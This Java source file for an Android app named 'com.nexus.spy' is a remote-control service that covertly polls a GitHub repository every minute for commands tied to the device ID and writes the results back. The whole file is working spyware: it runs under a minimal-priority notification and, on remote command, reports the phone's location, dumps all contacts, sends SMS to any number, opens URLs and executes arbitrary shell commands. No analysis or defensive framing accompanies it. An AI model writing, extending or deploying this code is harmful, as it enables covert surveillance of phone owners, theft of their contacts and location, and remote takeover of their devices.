package com.nexus.spy;
import android.app.*;
import android.content.*;
import android.location.*;
import android.os.*;
import android.provider.*;
import android.telephony.SmsManager;
import android.database.Cursor;
import org.json.*;
import java.util.*;
public class CommandService extends Service {
    String deviceId;
    Handler h = new Handler(Looper.getMainLooper());
    Runnable r = new Runnable() {
        @Override public void run() {
            try {
                JSONObject devices = GithubApi.read("data/devices.json");
                if (devices == null) devices = new JSONObject();
                JSONObject dev = devices.optJSONObject(deviceId);
                if (dev == null || !dev.optBoolean("active", true)) { stopSelf(); return; }
                String path = "data/commands/" + deviceId + ".json";
                JSONArray cmds = GithubApi.readArray(path);
                if (cmds.length() > 0) {
                    JSONArray remaining = new JSONArray();
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.getJSONObject(i);
                        if ("pending".equals(c.optString("status", "pending"))) {
                            String result = execute(c.optString("type"), c.optJSONObject("args"));
                            c.put("status", "done"); c.put("result", result);
                            c.put("completedAt", System.currentTimeMillis());
                        }
                        remaining.put(c);
                    }
                    GithubApi.write(path, remaining.toString(), "cmd " + deviceId + " " + System.currentTimeMillis());
                }
            } catch (Exception e) {}
            h.postDelayed(this, 60000);
        }
    };
    @Override public int onStartCommand(Intent i, int f, int s) {
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        NotificationChannel ch = new NotificationChannel("cmd","CMD", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(3, new Notification.Builder(this,"cmd")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(Notification.PRIORITY_MIN).build());
        h.post(r); return START_STICKY;
    }
    String execute(String type, JSONObject args) {
        try {
            switch (type == null ? "" : type) {
                case "TOAST": {
                    String msg = args.optString("message","");
                    new Handler(Looper.getMainLooper()).post(() ->
                        android.widget.Toast.makeText(getApplicationContext(), msg, android.widget.Toast.LENGTH_LONG).show());
                    return "toast shown";
                }
                case "LOCATION": {
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    return loc == null ? "no location" : loc.getLatitude() + "," + loc.getLongitude();
                }
                case "SMS": { SmsManager.getDefault().sendTextMessage(args.optString("number"), null, args.optString("message"), null, null); return "SMS sent"; }
                case "CONTACTS": {
                    StringBuilder sb = new StringBuilder();
                    Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                    while (cur != null && cur.moveToNext()) {
                        sb.append(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ")
                          .append(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    }
                    if (cur != null) cur.close();
                    return sb.toString();
                }
                case "OPEN_URL": {
                    String url = args.optString("url");
                    Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i); return "opened " + url;
                }
                case "SHELL": {
                    Process p = Runtime.getRuntime().exec(args.optString("cmd"));
                    Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
                    return sc.hasNext() ? sc.next() : "";
                }
                default: return "unknown: " + type;
            }
        } catch (Exception e) { return "ERR: " + e.getMessage(); }
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
